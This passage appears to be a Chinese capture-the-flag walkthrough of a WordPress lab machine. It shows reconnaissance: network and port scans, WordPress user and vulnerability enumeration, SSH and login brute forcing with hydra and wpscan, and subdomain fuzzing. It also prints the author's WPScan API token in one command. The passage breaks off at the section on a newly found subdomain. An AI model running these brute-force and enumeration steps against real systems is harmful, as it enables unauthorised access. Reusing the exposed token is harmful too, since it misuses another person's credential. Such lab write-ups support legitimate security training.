### 一、信息收集与初步探测

#### 1.1 主机发现

渗透测试的第一步通常是发现网络中的存活主机。这里我们使用`arp-scan`工具对本地网络进行扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l                   
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.211 08:00:27:ea:d3:f5       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f8:d7:c5       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.028 seconds (126.23 hosts/sec). 4 responded
```

扫描结果显示，IP地址为 `192.168.205.211` 的主机响应了ARP请求，其MAC地址为 `08:00:27:ea:d3:f5`，厂商信息为 `PCS Systemtechnik GmbH` (通常与Oracle VirtualBox相关)。该IP将作为我们后续渗透的目标。

#### 1.2 端口扫描

确定目标主机后，使用`nmap`进行端口扫描，以识别目标主机开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- --min-rate 10000 192.168.205.211
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 21:57 EDT
Nmap scan report for 192.168.205.211
Host is up (0.00027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
```

Nmap扫描结果表明，目标主机开放了 TCP 22端口 (SSH服务) 和 TCP 80端口 (HTTP服务)。

### 二、Web应用渗透测试

#### 2.1 域名解析与站点识别

直接通过IP地址访问目标主机的HTTP服务 (端口80)，发现网页内容提示需要解析域名。
![image-20250516095849516](https://7r1UMPH.top/image/20250516095856656.webp)

根据页面提示，该站点期望通过域名 `http://disguise.hmv` 访问。我们将此域名与目标IP的映射关系添加到本地 `/etc/hosts` 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "192.168.205.211 http://disguise.hmv" | sudo tee -a /etc/hosts > /dev/null
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tail -n 1 /etc/hosts
192.168.205.211 http://disguise.hmv
```

配置完成后，通过域名 `http://disguise.hmv` 访问站点。观察页面页脚信息，初步判断该站点是基于WordPress构建的。
![image-20250516100842676](https://7r1UMPH.top/image/20250516100842781.webp)

#### 2.2 WordPress漏洞扫描与信息收集

##### 2.2.1 Nuclei扫描

首先尝试使用`nuclei`对目标WordPress站点进行自动化漏洞扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nuclei -u http://disguise.hmv/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.2

                projectdiscovery.io

[INF] Current nuclei version: v3.4.2 (outdated)
[INF] Current nuclei-templates version: v10.2.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 42
[INF] Templates loaded for current scan: 7925
[WRN] Loading 198 unsigned templates for scan. Use with caution.
[INF] Executing 7727 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1736 (Reduced 1632 Requests)
[INF] Using Interactsh Server: oast.pro
[INF] No results found. Better luck next time!
```

Nuclei扫描未发现明显漏洞。接下来使用更专业的WordPress扫描工具`wpscan`。

##### 2.2.2 WPScan扫描

执行`wpscan`对站点进行详细枚举，包括用户、主题、插件等。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wpscan --url "http://disguise.hmv" --enumerate u,t,p,m --random-user-agent --api-token 6jJQ6zlZssGILOaGfCu2z7aVSLdYgEYokmESJuHejs8
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://disguise.hmv/ [192.168.205.211]
[+] Started: Thu May 15 22:20:25 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://disguise.hmv/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://disguise.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://disguise.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://disguise.hmv/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://disguise.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://disguise.hmv/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>
 |  - http://disguise.hmv/comments/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>

[+] WordPress theme in use: newscrunch
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | [!] The version is out of date, the latest version is 1.8.5
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1
 | Style Name: Newscrunch
 | Style URI: https://spicethemes.com/newscrunch
 | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.8.4.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1, Match: 'Version: 1.8.4.2'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] *
 | Location: http://disguise.hmv/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:03 <===================================================================================================> (400 / 400) 100.00% Time: 00:00:03
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] newsblogger
 | Location: http://disguise.hmv/wp-content/themes/newsblogger/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newsblogger/readme.txt
 | [!] The version is out of date, the latest version is 0.2.5.6
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/newsblogger/style.css
 | Style Name: NewsBlogger
 | Style URI: https://spicethemes.com/newsblogger-wordpress-theme/
 | Description: NewsBlogger is a dynamic and versatile child theme for the popular NewCrunch WordPress theme. Perfec...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://disguise.hmv/wp-content/themes/newsblogger/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: NewsBlogger < 0.2.5.5 - Cross-Site Request Forgery to Arbitrary Plugin Installation
 |     Fixed in: 0.2.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/916ba2a7-6592-4abf-acbf-63e46111b964
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1305
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7b2cac27-4a36-490f-b2d8-3c6f32843a38
 |
 | [!] Title: NewsBlogger < 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload
 |     Fixed in: 0.2.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/ab2f96dc-e786-48db-8207-a76ec50d7e63
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1304
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/85cea6b5-d57b-495e-a504-a0c1ba691637
 |
 | Version: 0.2.5.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newsblogger/style.css, Match: 'Version: 0.2.5.1'

[+] newscrunch
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | [!] The version is out of date, the latest version is 1.8.5
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css
 | Style Name: Newscrunch
 | Style URI: https://spicethemes.com/newscrunch
 | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://disguise.hmv/wp-content/themes/newscrunch/, status: 500
 |
 | Version: 1.8.4.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css, Match: 'Version: 1.8.4.2'

[+] twentytwentyfive
 | Location: http://disguise.hmv/wp-content/themes/twentytwentyfive/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfive/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.0'

[+] twentytwentyfour
 | Location: http://disguise.hmv/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.3 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/, status: 200
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.3'

[+] twentytwentythree
 | Location: http://disguise.hmv/wp-content/themes/twentytwentythree/
 | Latest Version: 1.6 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentythree/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentythree/, status: 200
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.6'

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 <===============================================================================================> (100 / 100) 100.00% Time: 00:00:00

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=====================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] simpleadmin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://disguise.hmv/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] simpleAdmin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 7
 | Requests Remaining: 18

[+] Finished: Thu May 15 22:20:43 2025
[+] Requests Done: 598
[+] Cached Requests: 26
[+] Data Sent: 176.914 KB
[+] Data Received: 23.432 MB
[+] Memory used: 285.922 MB
[+] Elapsed time: 00:00:18
```

WPScan扫描结果的关键信息：

*   `robots.txt`文件存在。
*   WordPress 版本为 `6.8.1` (最新版)。
*   主题 `newsblogger` 版本为 `0.2.5.1`，存在两个已知漏洞：
    *   `CVE-2025-1305`: NewsBlogger < 0.2.5.5 - CSRF to Arbitrary Plugin Installation.
    *   `CVE-2025-1304`: NewsBlogger < 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload. （这个看起来更有利用价值）
*   发现用户 `simpleadmin` (以及 `simpleAdmin`，可能为同一用户)。

#### 2.3 密码爆破尝试 (WordPress & SSH)

基于发现的用户 `simpleadmin`，尝试对其WordPress后台密码进行爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wpscan --url http://disguise.hmv -U simpleadmin -P /usr/share/wordlists/rockyou.txt --random-user-agent
```

同时，在另一个终端窗口尝试爆破SSH服务密码。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l simpleadmin -P 5000q.txt ssh://192.168.205.211 -I -u -f -e nsr -t 64
```

经过约10分钟的等待，两个爆破均未成功，判断密码爆破的路径可能行不通。

#### 2.4 Web目录爆破

尝试使用`gobuster`对`http://disguise.hmv`进行目录爆破，以发现可能存在的隐藏页面或资源。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dir -u http://disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://disguise.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,md,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://disguise.hmv/]
/rss                  (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/]
/login                (Status: 302) [Size: 0] [--> http://disguise.hmv/wp-login.php]
/login.php            (Status: 302) [Size: 0] [--> http://disguise.hmv/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://disguise.hmv/0/]
/feed                 (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/]
/atom                 (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/atom/]
/s                    (Status: 301) [Size: 0] [--> http://disguise.hmv/sample-page/]
/wp-content           (Status: 301) [Size: 317] [--> http://disguise.hmv/wp-content/]
/admin                (Status: 302) [Size: 0] [--> http://disguise.hmv/wp-admin/]
/h                    (Status: 301) [Size: 0] [--> http://disguise.hmv/2025/04/01/hello-world/]
/wp-login.php         (Status: 200) [Size: 5275]
/rss2                 (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/]
/license.txt          (Status: 200) [Size: 19903]
/wp-includes          (Status: 301) [Size: 318] [--> http://disguise.hmv/wp-includes/]
/wp-register.php      (Status: 301) [Size: 0] [--> http://disguise.hmv/wp-login.php?action=register]
/S                    (Status: 301) [Size: 0] [--> http://disguise.hmv/sample-page/]
/wp-rss2.php          (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/]
/H                    (Status: 301) [Size: 0] [--> http://disguise.hmv/2025/04/01/hello-world/]
/sa                   (Status: 301) [Size: 0] [--> http://disguise.hmv/sample-page/]
/rdf                  (Status: 301) [Size: 0] [--> http://disguise.hmv/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://disguise.hmv/]
Progress: 9864 / 1323360 (0.75%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 9882 / 1323360 (0.75%)
[ERROR] context canceled
[ERROR] context canceled
[ERROR] context canceled
===============================================================
Finished
===============================================================
```

目录爆破运行约2分钟后，发现扫描速度非常缓慢，推测WordPress站点可能存在WAF或其他防护机制。决定暂停扫描，寻找其他突破口。

### 三、网络层面信息发掘

#### 3.1 IPv6探测

尝试从IPv6层面进行探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ping6 -I eth0 ff02::1
ping6: Warning: IPv6 link-local address on ICMP datagram socket may require ifname or scope-id => use: address%<ifname|scope-id>
ping6: Warning: source address might be selected on device other than: eth0
PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=1 ttl=64 time=0.112 ms
64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=1 ttl=64 time=0.744 ms
64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=2 ttl=64 time=0.036 ms
64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=2 ttl=64 time=0.322 ms
^C
--- ff02::1 ping statistics ---
2 packets transmitted, 2 received, +2 duplicates, 0% packet loss, time 1022ms
rtt min/avg/max/mdev = 0.036/0.303/0.744/0.275 ms
```

`ping6`发现了两个IPv6本地链路地址。其中 `fe80::a00:27ff:feea:d3f5%eth0` 的MAC地址与之前IPv4扫描的目标主机MAC地址 `08:00:27:EA:D3:F5` 相符 (EUI-64转换)。
对这两个IPv6地址进行`nmap`端口扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -6 -p- fe80::9ffa:901:c1:10b9%eth0  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT
Nmap scan report for fe80::9ffa:901:c1:10b9
Host is up (0.0000070s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.33 seconds
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -6 -p- fe80::a00:27ff:feea:d3f5%eth0
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT
Nmap scan report for fe80::a00:27ff:feea:d3f5
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
```

对与目标MAC地址一致的IPv6地址 `fe80::a00:27ff:feea:d3f5%eth0` 进行服务版本探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -6 -sV -p22,80 fe80::a00:27ff:feea:d3f5%eth0
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:42 EDT
Nmap scan report for fe80::a00:27ff:feea:d3f5
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
```

IPv6扫描结果与IPv4一致，开放SSH (OpenSSH 7.9p1) 和 HTTP (Apache 2.4.59) 服务。

#### 3.2 流量监听

使用`tcpdump`监听目标主机 `192.168.205.211` 的网络流量，观察是否有异常通信。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo tcpdump -i eth0 host 192.168.205.211 -nn
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
22:44:40.505340 IP 192.168.205.211.41597 > 162.159.200.1.123: NTPv4, Client, length 48
22:44:40.876037 ARP, Request who-has 192.168.205.211 tell 192.168.205.2, length 46
22:44:40.876365 ARP, Reply 192.168.205.211 is-at 08:00:27:ea:d3:f5, length 46
22:44:40.876419 IP 162.159.200.1.123 > 192.168.205.211.41597: NTPv4, Server, length 48
22:44:45.642888 ARP, Request who-has 192.168.205.2 tell 192.168.205.211, length 46
22:44:45.642969 ARP, Reply 192.168.205.2 is-at 00:50:56:f4:ef:6f, length 46
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel
```

经过约1分钟的监听，捕获到的主要是NTP和ARP报文，未发现有价值的信息。

### 四、子域名爆破与关键发现

#### 4.1 FFUF子域名爆破 (初试)

将注意力转回Web层面，尝试进行子域名爆破。使用`ffuf`工具，通过修改Host头的方式进行探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ffuf -u http://disguise.hmv/ -H 'Host: FUZZ.disguise.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -fw 11916

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://disguise.hmv/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.disguise.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 11916
________________________________________________

www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

`ffuf`发现了一个子域名 `www.disguise.hmv`。将其添加到 `/etc/hosts` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo nano /etc/hosts                             
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.205.211 www.disguise.hmv disguise.hmv
```

使用`curl`检查 `www.disguise.hmv`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -I http://www.disguise.hmv
HTTP/1.1 301 Moved Permanently
Date: Fri, 16 May 2025 02:53:06 GMT
Server: Apache/2.4.59 (Debian)
X-Redirect-By: WordPress
Location: http://disguise.hmv/
Content-Type: text/html; charset=UTF-8
```

该子域名通过301重定向到主站 `http://disguise.hmv/`，没有提供新的攻击面。

#### 4.2 Gobuster DNS模式子域名爆破

考虑到`ffuf`扫描速度也较慢，尝试使用`gobuster`的DNS模式进行子域名爆破，首先使用大字典。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 3541 / 114442 (3.09%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 3553 / 114442 (3.10%)
===============================================================
Finished
===============================================================
```

`gobuster`使用大字典时也仅发现了 `www.disguise.hmv`。更换为较小的字典再次尝试。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

小字典扫描完毕，仍然只有 `www.disguise.hmv`。没办法了，也没其他的路了，硬扫吧。再次使用大字典进行扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 25708 / 114442 (22.46%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 25739 / 114442 (22.49%)
===============================================================
Finished
===============================================================
```

蛙趣，不对啊，2w多都没出来这么夸张？看看其他人的wp。操.......好像是软件问题。

#### 4.3 Wfuzz子域名爆破 (转机)

更换为`wfuzz`工具，同样通过修改Host头的方式进行子域名爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wfuzz -c -u "http://disguise.hmv/" -H "HOST:FUZZ.disguise.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 4602 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://disguise.hmv/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                           
=====================================================================

000000001:   301        0 L      0 W        0 Ch        "www - www"                                                                                                       
000005051:   200        18 L     52 W       846 Ch      "dark - dark"                                                                                                     
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 236.0730
Processed Requests: 8494
Filtered Requests: 8492
Requests/sec.: 35.98038
```

`wfuzz`成功爆破出新的子域名 `dark.disguise.hmv`！沉默是今晚的康桥。

将新发现的子域名 `dark.disguise.hmv` 添加到 `/etc/hosts` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo nano /etc/hosts                             
[sudo] password for kali: 
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat /etc/hosts                 
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.205.211 www.disguise.hmv disguise.hmv dark.disguise.hmv
```

访问 `http://dark.disguise.hmv`。
![image-20250516110839064](https://7r1UMPH.top/image/20250516110839497.webp)
页面显示为一个名为“暗黑商店”的站点，风格有点炫。

### 五、暗黑商店 (dark.disguise.hmv) 渗透测试

